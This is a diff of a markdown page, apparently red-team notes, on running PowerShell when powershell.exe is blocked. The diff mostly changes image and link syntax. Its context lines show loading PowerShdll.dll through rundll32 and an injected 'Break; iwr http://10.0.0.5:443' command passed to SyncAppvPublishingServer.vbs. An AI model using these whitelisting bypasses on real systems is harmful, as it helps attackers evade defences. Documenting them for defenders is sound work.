@@ -10,7 +10,7 @@ If you run into a situation where powershell.exe is blocked and no strict applic
 rundll32.exe PowerShdll.dll,main
 ```
 
-![](../../.gitbook/assets/pwshll-rundll32.gif)
+![[pwshll-rundll32.gif]]
 
 Note that the same could be achieved with a compiled .exe binary from the same project, but keep in mind that .exe is more likely to run into whitelisting issues.
 
@@ -22,14 +22,14 @@ Windows 10 comes with `SyncAppvPublishingServer.exe and` `SyncAppvPublishingServ
 SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
 ```
 
-![](../../.gitbook/assets/pwshll-SyncAppvPublishingServer.png)
+![[pwshll-SyncAppvPublishingServer.png]]
 
-![](../../.gitbook/assets/pwshll-SyncAppvPublishingServer.gif)
+![[pwshll-SyncAppvPublishingServer.gif]]
 
 ## References
 
-{% embed url="https://github.com/p3nt4/PowerShdll" %}
+[github.com/p3nt4/PowerShdll](https://github.com/p3nt4/PowerShdll)
 
-{% embed url="https://web.archive.org/web/20180202001408/https://safe-cyberdefense.com/malware-can-use-powershell-without-powershell-exe/" %}
+[web.archive.org/web/20180202001408/https://safe-cyberdefense.com/malware-can-use-powershell-without-powershell-exe](https://web.archive.org/web/20180202001408/https://safe-cyberdefense.com/malware-can-use-powershell-without-powershell-exe/)
 
-{% embed url="https://www.youtube.com/watch?v=7tvfb9poTKg" %}
+[www.youtube.com/watch?v=7tvfb9poTKg](https://www.youtube.com/watch?v=7tvfb9poTKg)
